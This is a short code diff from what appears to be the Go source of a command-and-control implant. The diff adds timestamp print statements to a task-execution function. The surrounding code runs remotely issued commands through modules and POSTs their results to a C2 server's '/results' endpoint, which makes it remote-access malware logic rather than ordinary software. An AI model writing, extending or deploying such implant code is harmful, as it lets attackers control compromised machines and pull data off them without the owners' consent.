@@ -153,6 +153,7 @@ func (i *Implant) fetchTasks() ([]Task, error) {
 }
 
 func (i *Implant) executeTask(task Task) (string, error) {
+	fmt.Println(time.Now())
 	moduleName := task.TaskType
 	module, found := i.Modules[moduleName]
 	if !found {
@@ -164,7 +165,7 @@ result, err := module.Execute(task.Command,nil)
 	if err != nil {
 		return "", fmt.Errorf("error executing module %s: %v", moduleName, err)
 	}
-
+	fmt.Println(time.Now())
 	// Send response to C2 server
 	responseData := map[string]string{
 		"implant_id": i.ImplantID,
@@ -176,12 +177,12 @@ result, err := module.Execute(task.Command,nil)
 	if err != nil {
 		return "", fmt.Errorf("error marshaling response data: %v", err)
 	}
-
+	fmt.Println(time.Now())
 	_,_, err = i.sendHTTPRequest("POST","/results", responseDataBytes,true)
 	if err != nil {
 		return "", fmt.Errorf("error sending task response: %v", err)
 	}
-
+	fmt.Println(time.Now())
 	return result, nil
 }
 
